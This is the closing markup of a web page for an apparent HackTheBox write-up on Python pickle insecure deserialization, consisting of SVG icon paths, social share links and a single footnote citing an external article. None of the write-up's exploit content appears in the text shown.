       <path d="M4.652 0h1.44l.988 3.702.916-3.702h1.454l-1.665 5.505v3.757h-1.431v-3.757l-1.702-5.505zm6.594 2.373c-1.119 0-1.861.74-1.861 1.835v3.349c0 1.204.629 1.831 1.861 1.831 1.022 0 1.826-.683 1.826-1.831v-3.349c0-1.069-.797-1.835-1.826-1.835zm.531 5.127c0 .372-.19.646-.532.646-.351 0-.554-.287-.554-.646v-3.179c0-.374.172-.651.529-.651.39 0 .557.269.557.651v3.179zm4.729-5.07v5.186c-.155.194-.5.512-.747.512-.271 0-.338-.186-.338-.46v-5.238h-1.27v5.71c0 .675.206 1.22.887 1.22.384 0 .918-.2 1.468-.853v.754h1.27v-6.831h-1.27zm2.203 13.858c-.448 0-.541.315-.541.763v.659h1.069v-.66c.001-.44-.092-.762-.528-.762zm-4.703.04c-.084.043-.167.109-.25.198v4.055c.099.106.194.182.287.229.197.1.485.107.619-.067.07-.092.105-.241.105-.449v-3.359c0-.22-.043-.386-.129-.5-.147-.193-.42-.214-.632-.107zm4.827-5.195c-2.604-.177-11.066-.177-13.666 0-2.814.192-3.146 1.892-3.167 6.367.021 4.467.35 6.175 3.167 6.367 2.6.177 11.062.177 13.666 0 2.814-.192 3.146-1.893 3.167-6.367-.021-4.467-.35-6.175-3.167-6.367zm-12.324 10.686h-1.363v-7.54h-1.41v-1.28h4.182v1.28h-1.41v7.54zm4.846 0h-1.21v-.718c-.223.265-.455.467-.696.605-.652.374-1.547.365-1.547-.955v-5.438h1.209v4.988c0 .262.063.438.322.438.236 0 .564-.303.711-.487v-4.939h1.21v6.506zm4.657-1.348c0 .805-.301 1.431-1.106 1.431-.443 0-.812-.162-1.149-.583v.5h-1.221v-8.82h1.221v2.84c.273-.333.644-.608 1.076-.608.886 0 1.18.749 1.18 1.631v3.609zm4.471-1.752h-2.314v1.228c0 .488.042.91.528.91.511 0 .541-.344.541-.91v-.452h1.245v.489c0 1.253-.538 2.013-1.813 2.013-1.155 0-1.746-.842-1.746-2.013v-2.921c0-1.129.746-1.914 1.837-1.914 1.161 0 1.721.738 1.721 1.914v1.656z" />
    </symbol>
    <symbol id="icon-gitlab" viewBox="-5 -15 220 200">
      <path d="M105.0614,193.655 L105.0614,193.655 L143.7014,74.734 L66.4214,74.734 L105.0614,193.655 L105.0614,193.655 Z" />
      <path d="M105.0614,193.6548 L66.4214,74.7338 L12.2684,74.7338 L105.0614,193.6548 Z" />
      <path d="M12.2685,74.7341 L12.2685,74.7341 L0.5265,110.8731 C-0.5445,114.1691 0.6285,117.7801 3.4325,119.8171 L105.0615,193.6551 L12.2685,74.7341 Z" />
      &lt;path d="M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z" "/&gt;
      <path d="M105.0614,193.6548 L143.7014,74.7338 L197.8544,74.7338 L105.0614,193.6548 Z" />
      <path d="M197.8544,74.7341 L197.8544,74.7341 L209.5964,110.8731 C210.6674,114.1691 209.4944,117.7801 206.6904,119.8171 L105.0614,193.6551 L197.8544,74.7341 Z" />
      <path d="M197.8544,74.7342 L143.7014,74.7342 L166.9744,3.1092 C168.1714,-0.5768 173.3854,-0.5758 174.5824,3.1092 L197.8544,74.7342 Z" />
    </symbol>
</defs></svg>

<p><br /></p>
<section class="share">

    <h2>Share</h2>

    <a aria-label="Share on Twitter" href="https://twitter.com/intent/tweet?text=Learn how to exploit Pickle Insecure Deserialization! HackTheBox &quot;baby website rick&quot; wirteup is now available!%20http://charming-cuchufli-c1e963.netlify.app/writeups/Web%20Hacking/Pickle%20Insecure%20Deserialization/%20via%20&#64;0xbro1&amp;hashtags=HackTheBox,Challenge,Easy,Web,insecure-deserialization,pickle,python," onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
        <svg class="icon icon-twitter"><use xlink:href="#icon-twitter"></use></svg>
    </a>

    <a aria-label="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://charming-cuchufli-c1e963.netlify.app/writeups/Web%20Hacking/Pickle%20Insecure%20Deserialization/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook">
        <svg class="icon icon-facebook"><use xlink:href="#icon-facebook"></use></svg>
    </a>

    <a aria-label="Share on Linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://charming-cuchufli-c1e963.netlify.app/writeups/Web%20Hacking/Pickle%20Insecure%20Deserialization/&amp;title=Pickle Insecure Deserialization&amp;summary=Learn how to exploit Pickle Insecure Deserialization! HackTheBox &quot;baby website rick&quot; wirteup is now available!&amp;source=
    " onclick="window.open(this.href, 'linkedin-share','width=580,height=296');return false;" title="Share on Linkedin">
        <svg class="icon icon-linkedin"><use xlink:href="#icon-linkedin"></use></svg>
    </a>

</section>

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>https://davidhamann.de/2020/04/05/exploiting-python-pickle/¬†<a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>
:ET